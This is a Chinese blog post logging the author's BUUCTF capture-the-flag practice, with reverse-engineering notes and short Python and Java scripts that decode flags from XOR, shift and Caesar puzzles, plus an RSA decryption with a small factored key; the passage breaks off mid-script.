<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>buu刷题记录 | All about secret</title><meta name="author" content="mobb"><meta name="copyright" content="mobb"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="1.luck_guy 123456789s&#x3D;&amp;#x27;icug&#96;of&amp;#x27;str&#x3D;list(s)flag &#x3D;&amp;#x27;GXY&amp;#123;do_not_&amp;#x27;for i in range(len(str)):    if i%2&#x3D;&#x3D;1:        flag+&#x3D;chr(ord(str[i])-2)    else:        flag+&#x3D;chr(ord(str[i])-1)pr">
<meta property="og:type" content="article">
<meta property="og:title" content="buu刷题记录">
<meta property="og:url" content="http://example.com/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
<meta property="og:site_name" content="All about secret">
<meta property="og:description" content="1.luck_guy 123456789s&#x3D;&amp;#x27;icug&#96;of&amp;#x27;str&#x3D;list(s)flag &#x3D;&amp;#x27;GXY&amp;#123;do_not_&amp;#x27;for i in range(len(str)):    if i%2&#x3D;&#x3D;1:        flag+&#x3D;chr(ord(str[i])-2)    else:        flag+&#x3D;chr(ord(str[i])-1)pr">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/img1.png">
<meta property="article:published_time" content="2023-04-25T09:47:48.000Z">
<meta property="article:modified_time" content="2024-06-24T02:40:17.125Z">
<meta property="article:author" content="mobb">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/img1.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
    },
    fancybox: {
      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'buu刷题记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-06-24 10:40:17'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const fontSizeVal = saveToLocal.get('global-font-size')
    if (fontSizeVal !== undefined) {
      document.documentElement.style.setProperty('--global-font-size', fontSizeVal + 'px')
    }
    
    const detectApple = () => {
      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/img1.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">All about secret</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 清单</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">buu刷题记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-25T09:47:48.000Z" title="发表于 2023-04-25 17:47:48">2023-04-25</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-06-24T02:40:17.125Z" title="更新于 2024-06-24 10:40:17">2024-06-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="buu刷题记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="1-luck-guy"><a href="#1-luck-guy" class="headerlink" title="1.luck_guy"></a>1.luck_guy</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221122005152510.png" alt="image-20221122005152510"></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&#x27;icug`of&#x27;</span></span><br><span class="line"><span class="built_in">str</span>=<span class="built_in">list</span>(s)</span><br><span class="line">flag =<span class="string">&#x27;GXY&#123;do_not_&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">2</span>==<span class="number">1</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[i])-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="built_in">str</span>[i])-<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h1 id="2-Maze"><a href="#2-Maze" class="headerlink" title="2.Maze"></a>2.Maze</h1><p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221122130013903.png" alt="image-20221122130013903"></p>
<h1 id="3-Younger-Drive"><a href="#3-Younger-Drive" class="headerlink" title="3.Younger-Drive"></a>3.Younger-Drive</h1><p>本题有壳upx，脱完之后拖进ida32，老样子，先查看字符串</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127101731656.png" alt="image-20221127101731656"></p>
<p>去看看input flag</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127101805668.png" alt="image-20221127101805668"></p>
<p>交叉引用看看哪里用到了</p>
<p>进入到这个函数看看，反汇编看看伪代码</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127102104250.png" alt="image-20221127102104250"></p>
<p>可以看到这是一个输入函数，是要我们输入对应的flag的，那就看看Source哪里有用到</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127102152427.png" alt="image-20221127102152427"></p>
<p>一个个查看</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127102208930.png" alt="image-20221127102208930"></p>
<p>多线程，对线程的了解不是太熟悉，只能硬靠百度了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127102243250.png" alt="image-20221127102243250"></p>
<p>这里对Source也就是我们的flag进行了加密，调用了sub_41112C函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127104148192.png" alt="image-20221127104148192"></p>
<p>这里就是对加密后的字符串进行比较了，一共30个字符，正确的话就打印出来，那就看看off_418004是什么</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127104335078.png" alt="image-20221127104335078"></p>
<p>现在可以回过头去看看那个创建多线程的函数了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127105101111.png" alt="image-20221127105101111"></p>
<p>主要是这两个线程</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127105129129.png" alt="image-20221127105129129"></p>
<p>StartAddress是进行加密的函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127105303338.png" alt="image-20221127105303338"></p>
<p>观察第二个线程的函数，sub_411B10，观察这两个函数后，都有个sleep(0X64u)，多线程这里应该是等第一个线程获取资源执行完之后sleep等待第二个线程执行，第二个线程执行完后又sleep等待第一个线程执行完，所以应该是交替进行的，再去看看加密函数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127105631858.png" alt="image-20221127105631858"></p>
<p>在网上看wp时大多这里都看不了，是因为堆栈不平衡，但是不知道为什么我这里直接进来了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221127112539061.png" alt="image-20221127112539061"></p>
<p>上脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">source=<span class="string">&quot;TOiZiZtOrYaToUwPnToBsOaOapsyS&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">list</span>=<span class="string">&quot;QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;</span></span><br><span class="line">s=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(source)):</span><br><span class="line">    <span class="keyword">if</span> (i%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">        flag+=source[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span>(source[i].isupper()): <span class="comment">#因为大写字母-32是27-52，对应list的小写字母，所以原字符是小写字母</span></span><br><span class="line">            s=<span class="built_in">list</span>.find(source[i])+<span class="number">96</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(s)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            s=<span class="built_in">list</span>.find(source[i])+<span class="number">38</span> <span class="comment">#小写字母-96是1-26</span></span><br><span class="line">            flag+=<span class="built_in">chr</span>(s)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<h1 id="4-Java逆向解密"><a href="#4-Java逆向解密" class="headerlink" title="4.Java逆向解密"></a>4.Java逆向解密</h1><p>下载题目后是class文件，所以使用jd-gui打开，逻辑比较简单，就直接上脚本了</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Java_reverse;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Java</span>逆向解密 </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		 <span class="keyword">int</span>[] KEY = &#123; </span><br><span class="line">			        <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, </span><br><span class="line">			        <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;</span><br><span class="line">		  String Flag=<span class="string">&quot;&quot;</span>;</span><br><span class="line">		  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;KEY.length;i++) &#123;</span><br><span class="line">			  <span class="keyword">char</span> ret=(<span class="keyword">char</span>) (KEY[i]-<span class="number">64</span> ^ <span class="number">0x20</span>);</span><br><span class="line">			  Flag+=ret;</span><br><span class="line">		  &#125;</span><br><span class="line">		  System.out.println(Flag);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="5-pyre"><a href="#5-pyre" class="headerlink" title="5.pyre"></a>5.pyre</h1><p>下载题目后发现是pyc文件，打也打不开，上网搜索一番后发现需要用uncompyle库来将pyc文件还原成py文件，百度之后知道了pyc文件是py文件编译之后的结果，这样之后再运行的时候就可以省去编译的时间了。</p>
<p>下载好uncompyle库之后想反编译发现报错</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221211015022289.png" alt="image-20221211015022289"></p>
<p>去网上搜寻一番</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/principle1/article/details/122064538">(164条消息) python3.10安装uncompyle6错误（已解决）_principle1的博客-CSDN博客_uncompyle6 安装</a></p>
<p>是要找到op_imports.py的185，全文搜索canonic_python_version，但是那篇博客修改的是canonic_version，所以应该搜索的是canonic_version</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221211015527703.png" alt="image-20221211015527703"></p>
<p>添加完成后重新执行<code>uncompyle6 attachment.pyc &gt; 1.py</code>得到1.py，这样就可以进行逆向了</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221211020051241.png" alt="image-20221211020051241"></p>
<p>脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">code = [<span class="string">&#x27;\x1f&#x27;</span>,<span class="string">&#x27;\x12&#x27;</span>,<span class="string">&#x27;\x1d&#x27;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;\x06&#x27;</span>,<span class="string">&#x27;\x14&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="string">&#x27;\x1b&#x27;</span>,<span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;\x01&#x27;</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">     code[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i])^<span class="built_in">ord</span>(code[i+<span class="number">1</span>]))</span><br><span class="line">     <span class="comment">#往回异或</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">     <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i)%<span class="number">128</span>),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">     <span class="comment">#减去下标</span></span><br></pre></td></tr></table></figure>

<h1 id="6-findit"><a href="#6-findit" class="headerlink" title="6.findit"></a>6.findit</h1><p>凯撒解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#key = [ 0x54, 0x68, 0x69, 0x73, 0x49, 0x73, 0x54, 0x68, 0x65, 0x46, 0x6c, 0x61, 0x67, 0x48, 0x6f, 0x6d, 0x65 ]</span></span><br><span class="line">key = [</span><br><span class="line">    <span class="number">0x70</span>, <span class="number">0x76</span>, <span class="number">0x6b</span>, <span class="number">0x71</span>, <span class="number">0x7b</span>, <span class="number">0x6d</span>, <span class="number">0x31</span>, <span class="number">0x36</span>, <span class="number">0x34</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x35</span>, <span class="number">0x32</span>, <span class="number">0x36</span>, <span class="number">0x32</span>, <span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x33</span>, <span class="number">0x6c</span>,</span><br><span class="line">    <span class="number">0x34</span>, <span class="number">0x6d</span>, <span class="number">0x34</span>, <span class="number">0x39</span>, <span class="number">0x6c</span>, <span class="number">0x6e</span>, <span class="number">0x70</span>, <span class="number">0x37</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x6d</span>, <span class="number">0x6e</span>, <span class="number">0x6b</span>, <span class="number">0x32</span>, <span class="number">0x38</span>, <span class="number">0x6b</span>, <span class="number">0x37</span>, <span class="number">0x35</span>, <span class="number">0x7d</span></span><br><span class="line">]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> key:</span><br><span class="line">    flag = flag + <span class="built_in">chr</span>(k)</span><br><span class="line"><span class="comment"># print(flag)</span></span><br><span class="line"></span><br><span class="line">letter = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>   <span class="comment"># 26个字母</span></span><br><span class="line">result = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="keyword">if</span> x.isalpha():     <span class="comment"># 只对字母进行偏移</span></span><br><span class="line">            x = (<span class="built_in">ord</span>(x) + i) % <span class="number">26</span></span><br><span class="line">            res = res + letter[x]</span><br><span class="line">        <span class="keyword">else</span>: res = res + x <span class="comment"># 不是字母的话，就直接加上去</span></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    result.append(res)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取真正的Flag</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;------------------------Real Flag---------------------------------------&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> ans <span class="keyword">in</span> result:</span><br><span class="line">    <span class="keyword">if</span> ans[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">&quot;flag&quot;</span>: <span class="comment"># 真正的答案是以flag开头的</span></span><br><span class="line">        <span class="built_in">print</span>(ans)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221212012848645.png" alt="image-20221212012848645"></p>
<h1 id="7-RSA1"><a href="#7-RSA1" class="headerlink" title="7.RSA1"></a>7.RSA1</h1><p>这里回顾一下RSA加密的原理</p>
<p>公钥E=(e,N),私钥D=(d,N),N是公开的，N是由两个质数组成，d是1 &lt; e &lt; 欧拉函数p,q相乘结果T的模反元素，即d与T模1同余</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221212101723579.png" alt="image-20221212101723579"></p>
<p>进行公钥解析得到公钥e,N</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221212102406742.png" alt="image-20221212102406742"></p>
<p>e=6553</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">N=86934482296048119190666062003494800588905656017203025617216654058378322103517</span><br></pre></td></tr></table></figure>

<p>用RSA Tool2解出另外的几个参数</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221212112524986.png" alt="image-20221212112524986"></p>
<p>这里找到了关于这个工具的使用教程</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MikeCoke/article/details/105920084">(164条消息) RSA求解明文，安利函数pow()_宁嘉的博客-CSDN博客_rsa算法求明文</a></p>
<p>之后在Cal.D解出D</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221212112725360.png" alt="image-20221212112725360"></p>
<p>跟网上的wp一对比发现D错了，D是跟p，q，e有关，但是N给了，使用的p，q也没错，只可能是e错了，这里我一开始用的是65537的HEX编码，这里才知道HEX编码和十六进制并不一样</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221212114426636.png" alt="image-20221212114426636"></p>
<p>65537的十六进制编码是1，这里我懵了，上网搜寻一番才知道，0~65535是无符号数的范围，65535是FFFF，+1后是65536，就是10000，再加1就是65537，就是10001。使用将e改成10001</p>
<p>在网上找了一个脚本，同时学习了一下with open，而且还有给python310添加了rsa库</p>
<p><img src="/2023/04/25/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20221212120630355.png" alt="image-20221212120630355"></p>
<p>脚本如下</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"></span><br><span class="line">e= <span class="number">65537</span></span><br><span class="line">n= <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p= <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q= <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line">d= <span class="number">81176168860169991027846870170527607562179635470395365333547868786951080991441</span></span><br><span class="line"></span><br><span class="line">key = rsa.PrivateKey(n,e,d,q,p)         <span class="comment">#在pkcs标准中,pkcs#1规定,私钥包含(n,e,d,p,q)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Desk\\output\\flag.enc&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:  <span class="comment">#以二进制读模式，读取密文</span></span><br><span class="line">    f = f.read()</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(f,key))           <span class="comment"># 